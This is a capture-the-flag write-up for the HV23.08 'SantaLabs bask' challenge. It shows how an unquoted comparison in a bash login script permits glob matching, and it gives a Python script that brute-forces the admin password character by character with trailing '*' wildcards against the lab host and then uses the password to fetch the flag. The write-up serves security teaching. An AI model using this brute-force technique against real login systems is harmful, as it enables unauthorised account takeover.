## [HV23.08] SantaLabs bask (coderion)
### Decription
> Ditch flask and complicated python. With SantaLabs bask, you can write interactive websites using good, old bash and even template your files by using dynamic scripting!  

> Hint #1: Santa noticed the snow had a very peculiar shape today.  
### Solution
When using [shellcheck](https://www.shellcheck.net/) and scanning the **post_login.sh** the tool reports a globbing vulnerability.
```
Line 14:
if [[ $ADMIN_PASSWORD == $POST_PASSWORD ]]; then
                         ^-- SC2053 (warning): Quote the right-hand side of == in [[ ]] to prevent glob matching.
```
This means that the password can be bruteforced character by character. You can use 'password*' and the * in the end just matches the rest.  
   
```python
import requests
from string import printable
from time import sleep
import re

url = 'http://xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx.idocker.vuln.land'

password = 'salami'
while True:
    for p in printable[:71]:
        print(f'trying {password+p}*')
        resp = requests.post(url+'/login', data=f'password={password+p}*').text
        while not ('redirecting' in resp or 'Invalid username or password!' in resp):
            print(f'continuing trying {password+p}*')
            resp = requests.post(url+'/login', data=f'password={password+p}*').text
            sleep(0.25)
        if 'redirecting' in resp:
            password += p
            break
    else:
        break

print('\nFlag: '+re.findall(r'(HV23\{\w.*?\})', requests.get(url+'/admin', cookies={'admin_token':password}).text)[0])
```
Flag: **HV23{gl0bb1ng_1n_b45h_1s_fun}**  